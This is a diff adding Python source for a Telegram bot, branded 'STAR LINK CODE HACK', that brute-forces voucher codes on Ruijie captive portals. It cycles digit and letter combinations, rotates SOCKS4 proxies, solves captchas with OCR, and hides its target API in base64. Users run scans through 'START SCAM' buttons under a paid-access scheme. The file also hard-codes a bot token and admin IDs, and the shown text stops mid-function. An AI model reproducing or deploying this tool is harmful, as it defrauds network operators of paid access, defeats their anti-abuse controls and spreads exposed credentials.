@@ -1,5 +1,348 @@
-python-telegram-bot
-requests
-aiohttp
-aiohttp_socks
-ddddocr
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
+from telebot.async_telebot import AsyncTeleBot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiohttp import web
+import cv2
+import ddddocr
+import numpy as np
+from datetime import datetime, timedelta, timezone
+from aiohttp_socks import ProxyConnector
+
+# ==================== CONFIGURATION ====================
+BOT_TOKEN = "8633805405:AAHIZ2VJfX7stoE9iM6WEmFzsAJAo365W6Q"
+ADMINS = ["5664638841"]
+ADMIN_USERNAME = "@mzw199761"
+
+def is_admin(user_id):
+    return str(user_id) in ADMINS
+
+LIVE_PROXIES = []
+
+async def fetch_live_proxies():
+    """အင်တာနက်ပေါ်မှ Live ဖြစ်နေသော SOCKS4 Proxy စာရင်းကို အလိုအလျောက်ဆွဲယူခြင်း"""
+    global LIVE_PROXIES
+    url = "https://githubusercontent.com"
+    try:
+        async with aiohttp.ClientSession() as temp_session:
+            async with temp_session.get(url, timeout=10) as resp:
+                if resp.status == 200:
+                    text = await resp.text()
+                    LIVE_PROXIES = [line.strip() for line in text.strip().split('\n') if line.strip()]
+                    print(f" Live SOCKS4 Proxies {len(LIVE_PROXIES)} ခု အောင်မြင်စွာ ရယူပြီးပါပြီ။")
+    except Exception as e:
+        print(f"Proxy Fetch Error: {e}")
+
+def get_next_proxy():
+    global LIVE_PROXIES
+    if not LIVE_PROXIES:
+        return None
+    return random.choice(LIVE_PROXIES)
+
+SUCCESS_CODE = asyncio.Queue()
+bot = AsyncTeleBot(BOT_TOKEN)
+user_data = {}
+approve = {}
+scan_tasks = {}
+success_messages = {}
+success_texts = {}
+limited_messages = {}
+limited_texts = {}
+captcha_state = {}
+session = None
+_connector = None
+CONCURRENCY = 100
+_voucher_sem = None
+_start_time = time.monotonic()
+
+MAX_CONCURRENT_SCANS = 20
+active_scans_count = 0
+active_scans_lock = asyncio.Lock()
+paid_users = {}
+
+async def handle(request):
+    return web.Response(text="Bot is awake and running 24/7!")
+
+async def web_server():
+    app = web.Application()
+    app.router.add_get('/', handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get('BOT_PORT', 8099))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+
+def get_main_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton(" PAID USER", callback_data="menu_paid"),
+        InlineKeyboardButton(" STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
+        InlineKeyboardButton(" Success Codes ကြည့်မည်", callback_data="menu_result"),
+        InlineKeyboardButton(" Scan ရပ်မည်", callback_data="menu_stop"),
+        InlineKeyboardButton(" Back", callback_data="menu_back")
+    )
+    return keyboard
+
+def get_voucher_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton(" VOUCHER 6 လုံး", callback_data="scan_6"),
+        InlineKeyboardButton(" VOUCHER 7 လုံး", callback_data="scan_7"),
+        InlineKeyboardButton(" VOUCHER 8 လုံး", callback_data="scan_8"),
+        InlineKeyboardButton(" VOUCHER 9 လုံး", callback_data="scan_9"),
+        InlineKeyboardButton(" VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
+        InlineKeyboardButton(" VOUCHER ascii-lower 9လုံး", callback_data="scan_ascii-lower9"),
+        InlineKeyboardButton(" VOUCHER all", callback_data="scan_all"),
+        InlineKeyboardButton("+ MIXED 6လုံး", callback_data="scan_mixed"),
+        InlineKeyboardButton("+ MIXED 8လုံး", callback_data="scan_mixed8"),
+        InlineKeyboardButton("+ MIXED 9လုံး", callback_data="scan_mixed9"),
+        InlineKeyboardButton(" Back", callback_data="menu_back")
+    )
+    return keyboard
+
+def get_digit_keyboard(mode):
+    keyboard = InlineKeyboardMarkup(row_width=5)
+    buttons = []
+    for i in range(10):
+        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
+    keyboard.add(*buttons)
+    keyboard.add(InlineKeyboardButton(" Random", callback_data=f"digit_{mode}_random"))
+    keyboard.add(InlineKeyboardButton(" Back", callback_data="menu_back"))
+    return keyboard
+
+def get_start_scam_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton(" START SCAM", callback_data="menu_start_scam"),
+        InlineKeyboardButton(" Back", callback_data="menu_back")
+    )
+    return keyboard
+
+def get_paid_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton(" PAID USER ဖြစ်ရန်", callback_data="menu_enter_userid"),
+        InlineKeyboardButton(" Back", callback_data="menu_back")
+    )
+    return keyboard
+
+def get_back_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(InlineKeyboardButton(" Back", callback_data="menu_back"))
+    return keyboard
+
+def get_scam_button_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton(" STOP SCAM", callback_data="menu_stop"),
+        InlineKeyboardButton(" Back", callback_data="menu_back")
+    )
+    return keyboard
+
+@bot.message_handler(commands=['start'])
+async def start(message):
+    user_id = str(message.chat.id)
+    user_name = message.from_user.first_name or message.from_user.username or "User"
+    if message.chat.id not in user_data:
+        user_data[message.chat.id] = {}
+    if user_id in paid_users or user_id in approve or is_admin(user_id):
+        approve[message.chat.id] = True
+        paid_users[user_id] = True
+        welcome_text = f" STAR LINK CODE HACK \n\n NAME: {user_name}\n USER ID: {user_id}\n\n မင်္ဂလာပါခင်ဗျာ!\n သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
+    else:
+        welcome_text = f" STAR LINK CODE HACK \n\n NAME: {user_name}\n USER ID: {user_id}\n\n သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n Admin: {ADMIN_USERNAME}"
+    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())
+@bot.message_handler(commands=['sendall'])
+async def send_all_broadcast(message):
+    if not is_admin(message.chat.id): return
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "Usage: /sendall [your_message]")
+        return
+    broadcast_text = f" ADMIN NOTIFICATION\n\n{args[1]}"
+    count = 0
+    for uid in user_data.keys():
+        try:
+            await bot.send_message(int(uid), broadcast_text)
+            count += 1
+            await asyncio.sleep(0.1)
+        except: continue
+    await bot.reply_to(message, f" User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")
+
+@bot.callback_query_handler(func=lambda call: True)
+async def callback_handler(call):
+    chat_id = call.message.chat.id
+    user_id = str(chat_id)
+    user_name = call.from_user.first_name or call.from_user.username or "User"
+    
+    if call.data == "menu_back":
+        text = f" STAR LINK CODE HACK \n\n NAME: {user_name}\n USER ID: {user_id}\n\n PAID USER - Unlimited Access"
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard())
+        await bot.answer_callback_query(call.id)
+        return
+    
+    if call.data == "menu_free_trial":
+        text = " Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://ruijienetworks.com"
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
+        await bot.answer_callback_query(call.id)
+        return
+    
+    if call.data == "menu_start_scam":
+        global active_scans_count, active_scans_lock
+        async with active_scans_lock:
+            if active_scans_count >= MAX_CONCURRENT_SCANS:
+                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=" Bot အလုပ်များနေပါသည်။ ခဏစောင့်ပါ။", reply_markup=get_back_keyboard())
+                await bot.answer_callback_query(call.id)
+                return
+            active_scans_count += 1
+        
+        mode = user_data.get(chat_id, {}).get('selected_mode', '6')
+        start_digit = user_data.get(chat_id, {}).get('start_digit')
+        
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f" Scan စတင်နေပါသည်...\n\n VOUCHER Mode: {mode}", reply_markup=get_scam_button_keyboard())
+        progress_msg = await bot.send_message(chat_id, " Scanning VOUCHER Codes...\n\n")
+        scan_id = str(uuid.uuid4())
+        
+        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=call.message, progress_msg=progress_msg, start_digit=start_digit))
+        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
+        await bot.answer_callback_query(call.id)
+        return
+        
+    if call.data == "menu_paid":
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=" သင့်အား Admin အဖြစ် သတ်မှတ်ပေးထားသဖြင့် အလိုအလျောက် Paid ဖြစ်ပြီးသားပါ။", reply_markup=get_back_keyboard())
+        await bot.answer_callback_query(call.id)
+        return
+
+    if call.data == "menu_result":
+        if chat_id in success_texts and success_texts[chat_id]:
+            text = f" Found Codes:\n" + "\n".join(success_texts[chat_id])
+        else:
+            text = " သင့်တွင် လက်ရှိရှာဖွေတွေ့ရှိထားသော Success Code မရှိသေးပါ။"
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
+        await bot.answer_callback_query(call.id)
+        return
+
+    if call.data == "menu_stop":
+        await stop_scan_command(call.message)
+        await bot.answer_callback_query(call.id, " Scan ကိုရပ်တန့်လိုက်ပါပြီ။")
+        return
+
+    if call.data.startswith("scan_"):
+        mode = call.data.replace("scan_", "")
+        if chat_id not in user_data: user_data[chat_id] = {}
+        if 'session_url' not in user_data[chat_id]:
+            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=" ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [url]", reply_markup=get_back_keyboard())
+            await bot.answer_callback_query(call.id)
+            return
+        if mode in ["6", "7", "8", "9"]:
+            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f" VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
+            return
+        user_data[chat_id]['selected_mode'] = mode
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f" VOUCHER အမျိုးအစား: {mode}\n\n START SCAM ကိုနှိပ်ပါ", reply_markup=get_start_scam_keyboard())
+        return
+
+    if call.data.startswith("digit_"):
+        parts = call.data.split("_")
+        mode, digit = parts[1], parts[2]
+        if chat_id not in user_data: user_data[chat_id] = {}
+        user_data[chat_id]['selected_mode'] = mode
+        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
+        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f" Mode: {mode} | ထိပ်စီး: {digit}\n\n START SCAM ကိုနှိပ်ပါ", reply_markup=get_start_scam_keyboard())
+        return
+
+@bot.message_handler(commands=['portal'])
+async def handle_portal(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, " /portal [your_portal_url]")
+        return
+    url = args[1]
+    if message.chat.id not in user_data: user_data[message.chat.id] = {}
+    await bot.reply_to(message, " Portal URL အားစစ်ဆေးနေပါသည်...")
+    if await check_session_url_improved(url):
+        user_data[message.chat.id]['session_url'] = url
+        await bot.reply_to(message, " URL အားသိမ်းဆည်းပြီးပါပြီ။", reply_markup=get_voucher_keyboard())
+    else:
+        await bot.reply_to(message, " Portal URL မှားယွင်းနေပါသည်။ ပြန်စစ်ပါ။")
+
+async def check_session_url_improved(session_url):
+    headers = {'user-agent': 'Mozilla/5.0'}
+    proxy_ip = get_next_proxy()
+    connector = ProxyConnector.from_url(f"socks4://{proxy_ip}") if proxy_ip else None
+    try:
+        async with aiohttp.ClientSession(connector=connector) as check_session:
+            async with check_session.get(session_url, allow_redirects=True, headers=headers, timeout=15) as response:
+                return response.status < 400
+    except: return False
+
+@bot.message_handler(commands=['stop'])
+async def stop_scan_command(message):
+    chat_id = message.chat.id
+    data = scan_tasks.get(chat_id)
+    if data and not data["task"].done():
+        data["stop"] = True
+        data["task"].cancel()
+        scan_tasks.pop(chat_id, None)
+        await bot.reply_to(message, " Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
+    else:
+        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())
+
+def digit_generator(length): return "".join(random.choice(string.digits) for _ in range(length))
+def all_generator(length=6): return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
+def ascii_generator(length=6): return "".join(random.choice(string.ascii_lowercase) for _ in range(length))
+
+def iter_codes(mode, start_digit=None):
+    if mode in ["6", "7", "8", "9"]:
+        length = int(mode)
+        if start_digit is not None:
+            start = int(start_digit) * (10 ** (length - 1))
+            end = (int(start_digit) + 1) * (10 ** (length - 1))
+            for i in range(start, end): yield str(i).zfill(length)
+            return
+        if mode in ["6", "7", "8"]:
+            codes = [str(i).zfill(length) for i in range(10 ** length)]
+            random.shuffle(codes)
+            yield from codes
+            return
+        while True: yield digit_generator(9)
+    if mode == "ascii-lower":
+        while True: yield ascii_generator(6)
+    if mode == "ascii-lower9":
+        while True: yield ascii_generator(9)
+    if mode == "all":
+        while True: yield all_generator(6)
+    if mode in ["mixed", "mixed8", "mixed9"]:
+        l = 6 if mode=="mixed" else (8 if mode=="mixed8" else 9)
+        while True: yield all_generator(l)
+    raise ValueError("Error")
+
+def format_progress(checked, total=None, speed=0, found=0):
+    return f"Scanning...\n\nChecked : {checked:,}\nSpeed : {speed:,.0f} codes/min\nSuccess : {found}"
+
+BATCH_SIZE = 1000
+
+async def get_session_id(session, session_url, previous_session_id=None):
+    try:
+        async with session.get(session_url, allow_redirects=True) as req:
+            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
+            return session_id.group(1) if session_id else previous_session_id
+    except: return previous_session_id
+
+async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
+    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
+    proxy_ip = get_next_proxy()
+    connector = ProxyConnector.from_url(f"socks4://{proxy_ip}") if proxy_ip else None
+    
+    async with aiohttp.ClientSession(connector=connector) as task_session:
+        session_id = await get_session_id(task_session, session_url, None)
+        if not session_id: return
+        auth_code = None
+        for _ in range(3):
+            try:
+                image = await Captcha_Image(task_session, session_id)
+                text = await asyncio.to_thread(_ocr_sync, image)
+                if text and await Varify_Captcha(task_session, session_id, text):
+                    auth_code = text
+                    break
+            except: continue
+        if not auth_code: return
+        
